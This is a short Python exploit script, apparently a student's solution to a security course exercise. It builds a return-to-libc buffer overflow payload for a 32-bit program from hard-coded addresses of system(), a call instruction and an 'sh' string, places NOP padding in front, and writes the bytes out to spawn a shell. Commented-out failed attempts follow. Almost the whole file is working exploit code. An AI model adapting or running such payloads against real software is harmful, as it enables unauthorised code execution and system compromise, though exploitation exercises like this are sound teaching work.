#!/usr/bin/env python3
import sys
from shellcode import shellcode
from struct import pack

# Your code here
padding = (b'\x90')                                 # nop-sled
ret = pack("<I", 0x080488b3)                        # address of call system instruction in greetings
new_ret_val = pack("<I", 0x0804fc1f)                # memory location of system() in the executable
bin_sh = pack("<I", 0x80bda40)                      # memory location of "sh" in program memory
                                                    # used to set up calls to system
                                                    # supplemental video which helped shape design of exploit:
                                                    # https://www.youtube.com/watch?v=m17mV24TgwY
ret_from_sh = pack("<I", 0x90909090)                # bad return value.. segfaults

payload = padding*18 + new_ret_val + ret + bin_sh + ret_from_sh
sys.stdout.buffer.write(payload )

###### failed attempts :'(
#payload  = padding*16 +  ret +  padding*2+new_ret_val
#payload  = padding*17 +  ret +  padding*1+new_ret_val +str.encode("/bin/sh")

#### This was weird.. it seems to execute but throws "sh: 1: mail/student: not found "
#### and segfaults.. the call to system isnt set up properly? 
# payload = padding*18 + new_ret_val + padding*0 + ret + pack("<I", 0xffffdeb6) 
